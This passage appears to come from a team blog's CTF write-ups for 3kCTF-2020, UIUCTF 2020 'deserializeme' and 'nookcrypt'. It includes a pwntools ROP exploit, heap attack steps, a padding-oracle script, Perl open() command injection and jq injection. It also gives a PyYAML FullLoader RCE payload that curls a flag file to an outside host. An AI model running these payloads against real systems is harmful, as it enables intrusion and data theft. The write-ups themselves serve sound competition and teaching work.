Zend version etc. Therefore, I spin up a Ubuntu VM and install the same version of php, enable opcache to get the same system ID.\nThe system ID is: e2c6579e4df1d9e77e36d2f4ff8c92b3\ncurl \u0026#34;http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../../../../var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin\u0026#34; --output -... \u0026lt;textarea class=\u0026#34;label-input100\u0026#34; style=\u0026#34;color:black;width: 100%;height: 300px;\u0026#34;\u0026gt;OPCACHEe2c6579e4df1d9e77e36d2f4ff8c92b3�x��_Jqҍ@������������������������_���Ӛ��_/var/www/html/flag.php������/var/www/html/flag.php1����q��������d!= VPyi0���Y�Į��{�opcache_get_statush���JK��\u0026amp;3k{Hail_the3000_years_7hat_are_b3h1nd}`Lq�(��\u0026lt;iframe width=\u0026#34;560\u0026#34; height=\u0026#34;315\u0026#34; src=\u0026#34;https://www.youtube.com/embed/y8zZXMLBin4\u0026#34; frameborder=\u0026#34;0\u0026#34; allow=\u0026#34;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\u0026#34; allowfullscreen\u0026gt;\u0026lt;/iframe\u0026gt;֖|�flag \u0026lt;/textarea\u0026gt; ... linker (Pwn; 493 points) Solved by cire meat pop.\nProgram root@kali:~/3kctf/linker# ./linker Welcome to your secret journal! Provide name size: 8 Provide a name: abcd Welcome abcd ! What would you like to do? 1- Get new blank page 2- Edit page content 3- Empty a page 4- Relogin 5- Exit \u0026gt;  This seems to be a heap challenge, which allow user to create, edit and free a chunk. Also, it provides a weird function (i.e., relogin) for changing the name which does nothing to the other functions, and usually means it will be used for later exploit.\nVulnerability In 3- Empty a page:\nputs(\u0026#34;Provide page index:\u0026#34;); read(0, \u0026amp;buf, 4uLL); idx = atoi(\u0026amp;buf); if ( idx \u0026lt; 0 || idx \u0026gt; 4 ) { puts(\u0026#34;Wrong index kiddo...\u0026#34;); } else if ( check_pages[idx] ) { free(pages[idx]); check_pages[idx] = 0; // vuln  --number_pages; } After freed a chunk, only the check[idx] is set to 0; and in Edit page content:\nputs(\u0026#34;Provide page index:\u0026#34;); read(0, \u0026amp;buf, 4uLL); idx = atoi(\u0026amp;buf); if ( idx \u0026lt; 0 || idx \u0026gt; 4 ) { puts(\u0026#34;Wrong index kiddo...\u0026#34;); } else if ( pages[idx] ) // not checked { puts(\u0026#34;Provide new page content:\u0026#34;); read(0, pages[idx], (int)page_size[idx]); } Edit function won't check check[idx], which means we can overwrite a free chunk.\nExploit As we can overwrite any data into the free chunk, we can perform some attack to overwrite __malloc_hook or __free_hook with one gadget rce.\nHowever, we had two problems.\n tcache techniques won't work with calloc  Solution: We filled up tcache and perform fastbin attack.  Theres are no show functions to leak libc addresses  Solution: We utilize unsorted bin attack to write unsorted bin address to name, then relogin to print the content of name.   Problem can't access tty; job control turned off\nWill this means we can't open the shell? Whatever, we change the approach from utilizing one gadget RCE to calling the system function. We can overwrite __free_hook with system, then free a chunk with content /bin/cat flag, yielding system(\u0026quot;/bin/cat flag\u0026quot;). However, if we want control __free_hook, we need to try harder. Finally, we perform fastbin attack to control pages and check_pages, edit the pointer of each page to an arbitrary address, and eventually we have arbitrary address write.\n3k{unlink_the_world_and_feel_the_void}\none and a half man (Pwn; 493 points) Solved by cire meat pop.\nProgram ssize_t vuln() { char buf; // [rsp+6h] [rbp-Ah]  return read(0, \u0026amp;buf, 0xAAuLL); } This is a short function that obviously vulnerable to buffer overflow. I have solved similar challenge before, and my approach was to overwrite first 2 byte the read_got to run one gadget RCE. It involves 4 bit randomness to satisfy, hence I have a 1/16 chance to solving it. It works, but can't access tty; job control turned off. Okay, I shouldn't forgot shell interaction is disabled from this server.\nExploit I find a syscall near the one gadget RCE so that we can jump to syscalls. It's time to construct ROP:\nmov eax, 0 ; pop rbp ; ret g1(in binary) mov edx, eax ; mov eax, edx ; ret (in libc) pop rdi; ret (in binary) pop rsi; pop r15; ret (in binary) move eax, 0x3b; syscall (in libc) By this ROP chain we can set edx (the third argument) to 0, control rdi and rsi (the first and the second arguments) and call sys_execve.\nsys_execve(*filename, argv[], envp[]) To cat flag:\nsys_execve(\u0026#39;/bin/cat\u0026#39;, [\u0026#39;/bin/cat\u0026#39;, \u0026#39;flag\u0026#39;], 0) Finally our script:\npayload = \u0026#34;a\u0026#34;*18 + flat(pop_rsi_r15, buf, 0, read_plt, vuln) p.send(payload) sleep(0.5) string = \u0026#34;/bin/cat\u0026#34;.ljust(0x10,\u0026#34;\\x00\u0026#34;)+p64(buf)+p64(buf+0x28) \\ +p64(0)+\u0026#34;flag\u0026#34;+\u0026#34;\\x00\u0026#34;*4 p.send(string) sleep(0.5) payload2 = flat(pop_rsi_r15, setvbuf_got, 0, read_plt, pop_rsi_r15, read_got, \\ 0, read_plt, g1, buf, setvbuf_plt, pop_rdi, buf, pop_rsi_r15, \\ buf+0x10, 0, read_plt) ret p.send(\u0026#34;a\u0026#34;*18 + payload2) sleep(0.5) p.send(\u0026#34;\\x5b\\xd6\u0026#34;) # (in libc) mov edx, eax ; mov eax, edx ; ret sleep(0.5) p.send(\u0026#34;\\x72\\x04\u0026#34;) # (in libc) move eax, 0x3b; syscall sleep(0.5) p.interactive() 3k{one_byte_and_a_half_overwrite_ftw!}\nmicroscopic (Reverse; 488 points) Solved by Mystiz.\nOpen with IDA pro. There is a curious function defined on sub_F7C:\nunsigned __int64 __fastcall sub_F7C(unsigned int a1) { case 3: // ...  // v3 hereby is the length of the length of the target ciphertext  ciphertext[v2] = (v3 ^ input[v12]) + v2; // ...  break; case 4: // ...  v9 = ciphertext[v12] != target_ciphertext[v12]; // ...  break; }  Hereby target_ciphertext is is an array of 39 integers, located on 0x202020. We can simply write a Python script that extract target_ciphertext and compute the corresponding input.\nelf = ELF(\u0026#39;challenge/micro\u0026#39;) target = elf.read(0x202020, 39*4) target = [unpack(\u0026#39;I\u0026#39;, target[4*i:4*i+4])[0] for i in range(39)] target = [(c-i)^39 for i, c in enumerate(target)] print(bytes(target)) # 3k{nan0mites_everywhere_everytime_ftw!} game (Reverse/Misc; 486+477 points) Solved by eriri.\ngame 1 find your way to the heart of the maze game 2 the shortest route is often the best You are given an Unity game folder at the beginning. When you start the game, you are in a dark maze. You can walk but not jump nor run. Nothing will be triggered when you walk out of the maze.\nI think there should be multiple ways to solve the challenge. One solution will be physcially break the maze. How to do that? By deleting the walls object in the level.\nWith Unity Assets Bundle Extractor, we are able to delete walls in /CTF_Data/level0 (which is level of the maze). \nAfter deleting some of the wall objects (for me I selected the GameObject Wall with number greater than 100) and returning to the game, you will find a wall that marks the flag for game 2:\n\nThere are some characters missing in the wall because we deleted some of the characters by accident. We did a bit of guess and finally got the flag: 3K-CTF-A-MAZE-ING.\nThere are also some floating walls inside the maze. When you walk through it you will get a word overlayed on the top left corner. \nDecompiling /CTF_Data/Managed/Assembly-CSharp.dll will get you the logic of the game.  If you find and hit the 6 walls with the right order (I guess it should be the shortest path from the starting point to the flag room), the game will output you a flag. If not, an error message will be displayed. \nHere in UABE we found 6 assets with duplicated names. It should correspond to the 6 floating walls in the game. \nAfter some tries (with a bit of luck), we were able to get the flag for game 1. \nFlag: 3K-CTF-GamingIsNotACrime.\nReference: https://github.com/imadr/Unity-game-hacking\npyzzle (Reverse/Misc/Crypto; 459+479 points) Solved by crabmony and Mystiz.\nPart 1 We are given a concrete syntax tree that is from LibCST.\nWe referred to the documentation and traverse the tree manually. Eventually we have manually parsed the tree into a Python script:\nimport binascii plaintext = \u0026#39;REDACTED\u0026#39; def exor(a, b): temp = \u0026#34;\u0026#34; for i in range(n): if a[i] == b[i]: temp = 0 else: temp = 1 return temp def BinaryToDecimal(binary): string = int(binary, 2) return string PT_Ascii = [ord(x) for x in plaintext] PT_Bin = [format(y, \u0026#39;08b\u0026#39;) for y in PT_Ascii] PT_Bin = \u0026#34;\u0026#34;.join(PT_Bin) n = 26936 K1 = \u0026#39;...\u0026#39; # Redacted as this binary string is too long. K2 = \u0026#39;...\u0026#39; # Ditto L1 = PT_Bin[:n] R1 = PT_Bin[n:] f1 = exor(R1,K1) R2 = exor(f1, L1) L2 = R1 f2 = exor(R2, K2) R3 = exor(f2, L2) L3 = R2 R3 = \u0026#39;...\u0026#39; # Ditto L3 = \u0026#39;...\u0026#39; # Ditto cipher = L3 + R3 plaintext = L6 + R6 plaintext = int(plaintext, 2) plaintext = binascii.unhexlify(\u0026#39;%x\u0026#39; % plaintext) print(plaintext) Since we are given everything (except the plaintext), we are able to recover the plaintext by reversing the operations. We ended up with a STP file that contains the flag: 3k{almost_done_shizzle_up_my_nizzle}.\nPart 2 From the STP file, apart from the flag, we have a bunch of nodes and edges. This part we are connecting the dots with Python:\ndef parse_line(line): return list(map(int, line.split(\u0026#39; \u0026#39;)[1:])) def main(): with open(\u0026#39;pyzzle2\u0026#39;) as f: lines = f.read().strip().split(\u0026#39;\\n\u0026#39;) edges = list(map(parse_line, lines[8:124])) points = list(map(parse_line, lines[127:271])) point_map = {} for id, x, y in points: point_map[id] = (x, y) im = Image.new(\u0026#39;1\u0026#39;, (1850, 110), color=1) draw = ImageDraw.Draw(im) for id1, id2, _ in edges: x1, y1 = point_map.get(id1) x2, y2 = point_map.get(id2) draw.line((x1, y1, x2, y2), fill=0) im.save(\u0026#39;flag.png\u0026#39;) main() \nFlag: 3K-PYZZLE_FO_SHIZZLE_MY_NIZZLE.\nA hundred friends (Crypto; 496 points) Solved by Mystiz.\nkey = RSA.generate(1024) pad = random.randint(1, 2**UPPER_BOUND) exp = random.randint(1, 3) c = pow(m**exp + pad, 3, key.n) This is a challenge similar to Multicast in PlaidCTF 2017. Theoretically, we should be able to recover the original message with 3 ciphertexts, assuming that those ciphertexts are encrypted with exp = 1.\nWe have written the core logic to retrieve the message, given some ciphertexts:\ndef attempt(subpairs): n = len(subpairs) # (m + pi)^3 = ci (mod ni) cs = list(map(lambda pair: pair[0], subpairs)) ns = list(map(lambda pair: pair[1], subpairs)) ps = list(map(lambda pair: pair[2], subpairs)) nprod = reduce(mul, ns) gs = [[0 for _ in range(n)] for _ in range(3+1)] for i in range(n): for j in range(3+1): gs[j][i] = binomial(3, j) * pow(ps[i], j, nprod) % ns[i] gs[3][i] = ((gs[3][i] - cs[i]) % ns[i] + ns[i]) % ns[i] gg = [int(crt(gs[i], ns)) for i in range(3+1)] # Defines e, Zn = Zmod(nprod) and the parameters for the # Coppersmith\u0026#39;s attack here. Omitted roots = coppersmith_howgrave_univariate(pol, nprod, beta, mm, tt, XX) if len(roots) \u0026gt; 0: return roots[0] (Some functions are copied from mimoo/RSA-and-LLL-attacks. They are not included here for simplicity)\nHowever, we are unable to recover the message from sampling three ciphertexts in 100 rounds (it should happen in around 27 rounds). The reason is the message isn't small enough for Coppersmith's attack. Hence, we are sampling more ciphertexts (from 3 to 5) and the attack worked:\nn = 5 attempt_count = 0 while True: random.shuffle(pairs) subpairs = pairs[:n] attempt_count += 1 if attempt_count % 100 == 0: print(f\u0026#39;Attempt {attempt_count}\u0026#39;) m = attempt(subpairs) if m is None: continue m = int(m) flag = m.to_bytes(length=(m.bit_length() + 7)//8, byteorder=\u0026#39;big\u0026#39;) print(subpairs) print(flag) break # b\u0026#39;3k{H4st4d_St1ll_Rul3S}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39; Note that there is a chance to return m^2 or m^3. As I am lazy, I just run the script again until it returns m.\nRSA textbook (Crypto; 496 points) Solved by Mystiz.\nThis challenge is similar to De1CTF's easyRSA. By reading the same reference paper [Howgrave-Graham 1999], we have the matrix in session 3.3. By using the matrix directly and perform LLL, we can recover d1 (the private key that corresponds to e1). We can then recover phi(n) and thus compute d (that corresponds to e), hence decrypting the ciphertext: 3k{hOwGr4v3_gr4h4m_and_s31F3rt_4re_C00l}AAAAAAAAAAAAAAAAAAAA.\nYou shall not get my cookies (Crypto; 495 points) Solved by Mystiz.\nThis is a standard padding oracle attack.\ndef connect(): HOST = \u0026#39;youshallnotgetmycookies.3k.ctf.to\u0026#39; PORT = 13337 global debug if debug: context.log_level = \u0026#39;debug\u0026#39; else: context.log_level = \u0026#39;error\u0026#39; r = remote(HOST, PORT) return r def oracle(ciphertext): r = connect() payload = binascii.hexlify(ciphertext) r.sendlineafter(b\u0026#39;~ So... whats your cookie:\u0026#39;, payload) r.recvuntil(b\u0026#39;~ \u0026#39;) res = r.recvline().strip() r.close() return res != b\u0026#39;That cookie looks burned!\u0026#39; def main(): ciphertext = binascii.unhexlify(\u0026#39;90C560B2A01529EF986E54B016E1FEAAD79A54BE52B373311E3B4F8251BE269EC199AE6B370BFCE50A54EEC25ABB0F22\u0026#39;) po = PaddingOracle(oracle, threads=16) plaintext = po.recover(ciphertext) print(plaintext) # b\u0026#39; chocolate chip cookie\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\u0026#39; ciphertext = po.forge(b\u0026#39;Maple Oatmeal Biscuits\u0026#39; + b\u0026#39;\\x0a\u0026#39; * 10) r = connect() r.sendlineafter(b\u0026#39;~ So... whats your cookie:\u0026#39;, binascii.hexlify(ciphertext)) r.interactive() # ~ YES, that is exactly what i wanted! # ~ Take it! 3k{Y3t_An0th3r_Padd1ng_Oracle} main() once upon a time (Crypto; 492 points) Solved by Mystiz.\nWith a bit of code review, it is running a block cipher with block size = 1 (Source: the encrypt_file method in /src/cipher.c). The key is also redacted from the source (Source: /src/main.c). Moreover, surprisingly, the key is not redacted from the binary.\n*(_QWORD *)v45 = \u0026#39;\\x01\\0\\0\\0\\x01\\x01\\x01\\0\u0026#39;; *(_QWORD *)\u0026amp;v45[8] = \u0026#39;\\x01\\0\\x01\\0\\0\\x01\\x01\\0\u0026#39;; *(_QWORD *)\u0026amp;v45[16] = \u0026#39;\\x01\\0\\x01\\0\\x01\\0\\0\u0026#39;; *(_QWORD *)\u0026amp;v45[24] = \u0026#39;\\x01\\x01\\x01\\x01\\x01\\0\\0\\x01\u0026#39;; *(_QWORD *)\u0026amp;v45[32] = \u0026#39;\\x01\\0\\0\\0\\0\\0\\x01\\x01\u0026#39;; But if you think I am going to reverse the algorithm, you are wrong. I'm just using the binary as an encryption oracle.\ndef encrypt(plaintext, mode): context.log_level = \u0026#39;error\u0026#39; with open(\u0026#39;plaintext\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(plaintext) r = process([\u0026#39;challenge/scss\u0026#39;, \u0026#39;plaintext\u0026#39;, \u0026#39;ciphertext\u0026#39;, \u0026#39;encrypt\u0026#39;, mode]) r.wait_for_close() r.close() with open(\u0026#39;ciphertext\u0026#39;, \u0026#39;rb\u0026#39;) as f: ciphertext = f.read() return ciphertext def recover(target_ciphertext, mode): message = b\u0026#39;\u0026#39; for i in range(len(target_ciphertext)): for j in range(256): plaintext = message + bytes([j]) ciphertext = encrypt(plaintext, mode) if target_ciphertext.startswith(ciphertext): message = plaintext print(i, message) break return message def main(): with open(\u0026#39;challenge/flag_encrypted\u0026#39;, \u0026#39;rb\u0026#39;) as f: target_ciphertext = f.read() # print(recover(target_ciphertext, \u0026#39;ecb\u0026#39;)) # print(recover(target_ciphertext, \u0026#39;cbc\u0026#39;)) # print(recover(target_ciphertext, \u0026#39;cfb\u0026#39;)) print(recover(target_ciphertext, \u0026#39;ofb\u0026#39;)) # b\u0026#39;3k{my_hands_are_registered_as_lethal_weapons_that_means_we_get_into_a_fight_i_accidentally_kill_you_i_go_to_jail}\u0026#39; flood (Misc; 495 points) Solved by Mystiz.\nWe have a service running remotely. The source code, service.pl, is given to us. Perl sadness2 strikes back...\nObviously, we can actually earn more gold by selling gold. From the source code:\nprint \u0026#34;? how much gold u wanna spend\\n\u0026#34;; print \u0026#34;! 1 GOLD = 1000 POINTS\\n\u0026gt; \u0026#34;; my $subm = \u0026lt;STDIN\u0026gt;; chomp $subm; if( ($subm) \u0026lt;= $gold and int($subm)\u0026gt;=0){ $gold -= ($subm); $points += ($subm)*1000; } Why? We can set $subm = -0.9999... In this case we can generate as much gold as we want.\nAnother vulnerability comes from theh following line that runs during load game. This API opens if you are rich enough -- well, we are.\n# $name is what we can control. However, `.`, `/` and ` ` are forbidden. open (SAVEGAME, \u0026#34;/app/files/\u0026#34;.$name) or break; How? For example, if $name = \u0026quot;||ls|\u0026quot;; it executes ls from shell. But what if we want to execute ls / given that and / are forbidden? In short, we can use \\t (\u0026lt;TAB\u0026gt;) in place of the (\u0026lt;SPACE\u0026gt;), and $(expr\\tsubstr\\t$PWD\\t1\\t1) in place of /.\nHence, we can send use ||ls\\t\u0026quot;$(expr\\tsubstr\\t$PWD\\t1\\t1)\u0026quot;\\t-al| as our name and the directory can be listed. The following line is curious...\n-rw-r--r-- 1 root root 30 Jul 23 14:26 fcad0373020fa6ede979389f558b396f4cd38ec1_README\u0026#39; We can use cat /fcad0373020fa6ede979389f558b396f4cd38ec1_README (with the above substitution) as our name. Finally the flag is there: 3k{p333rl_aInt_7hat_deAd_Y3t}.\nlibcDB (Misc; 494 points) We are given a libc database search (which looks useful and we should definitely have one ourselves!). Playing with the API we have met the following error:\n\u0026gt; .search fprintf 0x4b970 .. jq: error: Invalid numeric literal at EOF at line 1, column 3 (while parsing \u0026#39;...\u0026#39;) at \u0026lt;top-level\u0026gt;, line 1: . as $maindb | .libcDB[] | select(.symbol==\u0026#34;fprintf\u0026#34;) | select(.address|contains(\u0026#34;309616\u0026#34;)) | ... jq: 1 compile error If we have to make an educated guess on the actual query, it would be:\njq \u0026#39;. as $maindb | .libcDB[] | select(.symbol==\u0026#34;[SYMBOL]\u0026#34;) \\ | select(.address|contains(\u0026#34;[ADDR]\u0026#34;)) | .[FILTER]\u0026#39; test.json Read along the documentation of jq, we have experimented around:\n\u0026gt; .search fprintf 0 |$maindb|keys|{id:.[]} Found: id\tlibcDB Found: id\tusers\u0026gt; .search fprintf 0 |$maindb.users[]|keys|{id:.[]} Found: id\tpassword Found: id\tusername\u0026gt; .search fprintf 0 |$maindb.users[]|{id:.username,symbol:.password} Found: id\t3k symbol\tnotaflag Found: id\tJames symbol\tHetfield Found: id\tLars symbol\tUlrich Found: id\tDead symbol\tpool Found: id\tadmin symbol\tv3ryL0ngPwC4nTgu3SS0xfff Found: id\tjim symbol\tcarrey Okay. Great, we have the credentials of the admin. Connecting to the service again, and this time we are signing in with it.\n$ nc libcdb.3k.ctf.to 7777 Login \u0026gt; admin Password \u0026gt; v3ryL0ngPwC4nTgu3SS0xfff Authenticated {\u0026#34;users\u0026#34;:{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;v3ryL0ngPwC4nTgu3SS0xfff\u0026#34;}} __ _ _ ____ _____ | | |_| |_ ___| \\| __ | | |__| | . | _| | | __ -| |_____|_|___|___|____/|_____| as a service Type .help for help \u0026gt; .secret 3k{jq_is_r3ally_HelpFULL_3af4bcd97f5}  DNS rebinding from Wikipedia [return] The Perm Jam 2: The Camel Strikes Back - @na7irub [return]   ","permalink":"https://b6a.black/posts/2020-07-28-3kctf/","summary":"reporter (Web; 498 points) Solved by apple.\nAuthor: rekter0\n Reporter is an online markdown reporting tool. it's free to use for everyone. there's a secret report we need located here\nsource\n Walkthrough The application provide markdown hosting service and it will automatically download and embed external images (or any files) to the 'report'.\nThere are 4 buttons on the interface: Edit, Preview, Save, and Deliver.\nThe first target of the challenge is to access the secret_report.","title":"3kCTF-2020 Writeup"},{"content":" Update: It was assigned as CVE-2020-14343 after the contest.\n This was a fun challenge exploiting a deserialize service in Python.\nThe server is using pyYAML and Flask, with the source code below:\nfrom flask import Flask, session, request, make_response import yaml import re import os app = Flask(__name__) app.secret_key = os.urandom(16) @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#34;POST\u0026#34;]) def pwnme(): if not re.fullmatch(b\u0026#34;^[\\n --/-\\]a-}]*$\u0026#34;, request.data, flags=re.MULTILINE): return \u0026#34;Nice try!\u0026#34;, 400 return yaml.load(request.data) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8080) Bascially it is a service to do yaml.load() to your input and print it (return) with limitation to block some special character (especially . and _)\nThe version of pyYAML and flask is both at latest release, so its not with an challenge with an existing CVE.\nWe noticed that yaml.load is \u0026quot;unsafe\u0026quot; by the README:\nWhen LibYAML bindings are installed, you may use fast LibYAML-based parser and emitter as follows: \u0026gt;\u0026gt;\u0026gt; yaml.load(stream, Loader=yaml.CLoader) \u0026gt;\u0026gt;\u0026gt; yaml.dump(data, Dumper=yaml.CDumper) If you don\u0026#39;t trust the input stream, you should use: \u0026gt;\u0026gt;\u0026gt; yaml.safe_load(stream) So we dig into the internals of yaml loader.\nFrom the source code, when loader is not provided, it uses FullLoader\ndef load(stream, Loader=None): \u0026#34;\u0026#34;\u0026#34; Parse the first YAML document in a stream and produce the corresponding Python object. \u0026#34;\u0026#34;\u0026#34; if Loader is None: load_warning(\u0026#39;load\u0026#39;) Loader = FullLoader loader = Loader(stream) try: return loader.get_single_data() finally: loader.dispose() And FullLoader uses FullConstructor to construct the python objects in: https://github.com/yaml/pyyaml/blob/5.3.1/lib3/yaml/constructor.py\nThe differences of FullConstructor and UnsafeConstructor is, UnsafeConstructor can uses the yaml tag: python/object/apply (that can be used to call functions) and it doesn't block some reserved keywords.\nFrom there, we guessed the challenge was to do an RCE using python/object/new tag (that is available in FullConstructor) and somehow bypass the CVE-2020-1747 fixes. (With the POC here)\nThe CVE-2020-1747 exploits the fact that user can input a object with a customized extend function, so that after the object is constructed (with python/object/new / python/object/apply), it can trigger the function extend as it is used by the constructor as below:\ndef construct_python_object_apply(self, suffix, node, newobj=False): ... instance = self.make_python_instance(suffix, node, args, kwds, newobj) if state: self.set_python_instance_state(instance, state) if listitems: instance.extend(listitems) if dictitems: for key in dictitems: instance[key] = dictitems[key] return instance While the format of python/object/apply can supply states for the object, we can use python/name to reference a python internal function (exec, eval etc). We cannot use an module function as . and _ is blocked, so the CVE PoC cannot be used. (and it used apply, which is blocked by FullConstructor)\n# !!python/object/apply # (or !!python/object/new) # args: [ ... arguments ... ] # kwds: { ... keywords ... } # state: ... state ... # listitems: [ ... listitems ... ] # dictitems: { ... dictitems ... } # or short format: # !!python/object/apply [ ... arguments ... ] The 5.3.1 fixes also blocked the key extend and ^__.*__$ to disallow setting those key with the state parameter.\nWe discovered that we can use python/object/new with type constructor (type is a type...) to create new types with some customized internal state. With this, we can bypass the state key block mechanism and freely set our object to something like this:\n!!python/object/new:type args: [\u0026#34;z\u0026#34;, !!python/tuple [], {\u0026#34;extend\u0026#34;: !!python/name:exec }] With this we can put our commands to listitems, and the constructor will call instance.extend(listitems), thus finish our RCE exploit.\nFull payload:\n!!python/object/new:type args: [\u0026#34;z\u0026#34;, !!python/tuple [], {\u0026#34;extend\u0026#34;: !!python/name:exec }] listitems: \u0026#34;\\x5f\\x5fimport\\x5f\\x5f(\u0026#39;os\u0026#39;)\\x2esystem(\u0026#39;curl -POST mil1\\x2eml/jm9 -F x=@flag\\x2etxt\u0026#39;)\u0026#34; (We changed _ to \\x5f and . to \\x2e to bypass the regex limitation)\nThe intended solution uses map as a type (as it is a type in Python 3):\n!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ \u0026#39;PAYLOAD_HERE\u0026#39; ]]] This is essentially the python code tuple(map(eval, \u0026quot;PAYLOAD\u0026quot;))), and this works as map and tuple are both class constructor (so it doesnt use any function as apply calls).\nThanks for the author for such cool challenge (basically used a 0day for the CTF challenge).\n","permalink":"https://b6a.black/posts/2020-07-22-uiuctf-deserializeme/","summary":"Update: It was assigned as CVE-2020-14343 after the contest.\n This was a fun challenge exploiting a deserialize service in Python.\nThe server is using pyYAML and Flask, with the source code below:\nfrom flask import Flask, session, request, make_response import yaml import re import os app = Flask(__name__) app.secret_key = os.urandom(16) @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#34;POST\u0026#34;]) def pwnme(): if not re.fullmatch(b\u0026#34;^[\\n --/-\\]a-}]*$\u0026#34;, request.data, flags=re.MULTILINE): return \u0026#34;Nice try!\u0026#34;, 400 return yaml.load(request.data) if __name__ == \u0026#39;__main__\u0026#39;: app.","title":"UIUCTF 2020: deserializeme"},{"content":"Challenge Summary  Tom Nook is testing a new encryption scheme for nookphones, but it seems to be a bit faulty... can you break it?\n nookcrypt is a netcat service that have no source code released. There are two functions exposed:\n Gets an encrypted copy of the flag (and the message hello world). Encrypts an arbitrary message.  For example, this is what I had when trying out the options:\nOption: 1 enc(FLAG) = (0xf31ce7cb1f2c6e7107318d76bdda50c5, 0x02d979fc3122bbaffcc1111953bc184f) enc(\u0026#39;hello world\u0026#39;) = (0x4cf5afcc9bc1db0118172129b713d86a, 0xe41d8761370768aa9694b164c843dde9) Option: 2 msg: hello world enc(0x68656c6c6f20776f726c64) = (0x4cf5afcc9bc1db0118172129b713d86a, 0xe41d8761370768aa9694b164c843dde9) Since the response is consistent after reconnecting to the netcat service for multiple times, I assume that the parameters are constant.\nSolution Part I: Recovering the curve parameters in a stupid way Since it is mentioning elliptic curves in its services, the first thing I was doing is to recover the parameters, namely, $a$, $b$ and $p$ for the elliptic curve $y^2 \\equiv x^3 + ax + b\\ (\\text{mod}\\ p)$.\nMy attempt is to encrypt a bunch of messages:\nmsg: a enc(0x61) = (0xb2d6c27a99b52aec6e243d4e4f67cb71, 0x9dfa2bd87ea1e09388493137132cc534) msg: b enc(0x62) = (0x99b8150ebf23c69ee1056f0e329496ae, 0xe1febe35a5877f00f3876c2a24fb9164) msg: c enc(0x63) = (0x3e7ef6d1106382119a0fa8c966f6d1df, 0x89d81b9fab5336a227414491881bbee8) msg: d enc(0x64) = (0x985dbb38a65f4e69bfc602d7e114cad9, 0xcad1cb62a3d30b05093575f3a22f7e3c) ... Define $C_i = (x_i, y_i)$ be the ciphertexts of some message $m_i$. By direct substitution, we have $y_i^2 \\equiv x_i^3 + ax_i + b\\ (\\text{mod}\\ p)$ for all $i$.\nAssume that we have three ciphertexts. We can deduce that:\n $a(x_1 - x_2) \\equiv y_1^2 - y_2^2 - x_1^3 + x_2^3 \\ (\\text{mod}\\ p)$ and $a(x_2 - x_3) \\equiv y_2^2 - y_3^2 - x_2^3 + x_3^3 \\ (\\text{mod}\\ p)$.  From above, we know $(y_1^2 - y_2^2 - x_1^3 + x_2^3)(x_2 - x_3) - (y_2^2 - y_3^2 - x_2^3 + x_3^3)(x_1 - x_2)$ is a multiple of $p$.\nSo we have collected a bunch of \u0026quot;multiples of $p$\u0026quot; and take their gcd. We have recovered that $p = 340282366762482138434845932244680310783$.\nThen it is rather obvious to recover $a = 284470887156368047300405921324061011681$ and $b = 126188322377389722996253562430093625949$.\nQuestion. What if it is not defined on a prime field? Well\u0026hellip; I didn\u0026rsquo;t think of that. But who cares? I could probably observe this if my approach doesn\u0026rsquo;t work out.  Part II: A reflection on the \u0026quot;after-math\u0026quot; Note. I did not think of this during the game. Stupid me.  Knowing that the ciphertext $C$ is a multiple of the message $m$, i.e., $C = mG$, we can simply encrypt $m = 1$:\n[+] Opening connection to chal.uiuc.tf on port 2006: Done [DEBUG] Received 0x123 bytes: b\u0026#39;\\n\u0026#39; b\u0026#39;========================================\\n\u0026#39; b\u0026#39;Welcome to NookCrypt! Here we use fancy\\n\u0026#39; b\u0026#39;elliptic curve encryption to keep your \\n\u0026#39; b\u0026#39;messages safe! Try it out!\\n\u0026#39; b\u0026#39;========================================\\n\u0026#39; b\u0026#39;1. get (encrypted) flag\\n\u0026#39; b\u0026#39;2. encrypt message\\n\u0026#39; b\u0026#39;3. quit\\n\u0026#39; b\u0026#39;========================================\\n\u0026#39; b\u0026#39;\\n\u0026#39; b\u0026#39;Option: \u0026#39; [DEBUG] Sent 0x2 bytes: b\u0026#39;2\\n\u0026#39; [DEBUG] Received 0x5 bytes: b\u0026#39;msg: \u0026#39; [DEBUG] Sent 0x2 bytes: 00000000 01 0a │··│ 00000002 [DEBUG] Received 0x178 bytes: b\u0026#39;enc(0x01) = (0x7b6aa5d85e572983e6fb32a7cdebc140, 0x27b6916a894d3aee7106fe805fc34b44)\\n\u0026#39; b\u0026#39;\\n\u0026#39; b\u0026#39;========================================\\n\u0026#39; b\u0026#39;Welcome to NookCrypt! Here we use fancy\\n\u0026#39; b\u0026#39;elliptic curve encryption to keep your \\n\u0026#39; b\u0026#39;messages safe! Try it out!\\n\u0026#39; b\u0026#39;========================================\\n\u0026#39; b\u0026#39;1. get (encrypted) flag\\n\u0026#39; b\u0026#39;2. encrypt message\\n\u0026#39; b\u0026#39;3. quit\\n\u0026#39; b\u0026#39;========================================\\n\u0026#39; b\u0026#39;\\n\u0026#39; b\u0026#39;Option: \u0026#39; What can we do? Since this is $G$, we can simply search this on Google:\n  Ta-da :tada: - it is the generator for curve secp128r2. You would think this is a ta-da moment, I would say that this is a facepalm moment. I could spent much less time on recovering the parameters in such a way.\nWell, I was even more confused to notice that is a secure curve. I personally don't have a backdoor of secp128r2 (I am much appreciated if you tell me if you do) and thought the challenge isn't doable.\nPart III: \u0026quot;Hint for nookcrypt (crypto 500)\u0026quot; Fours hours later the organizers released a hint in the Discord server:\n  When I was being played writing an interactor with the service, I observed that there was a strange behaviour regarding to the flag encryption method:\n======================================== Welcome to NookCrypt! Here we use fancy elliptic curve encryption to keep your messages safe! Try it out! ======================================== 1. get (encrypted) flag 2. encrypt message 3. quit ======================================== Option: 1 err Oh. So the error was caused by the cosmic ray. Okay.\nDid you really get it instantly when the hint is announced? No.  Part IV: Somebody made a breakthrough Ten hours later, somebody from Discord claimed that he has a strange observation:\n  Who was the 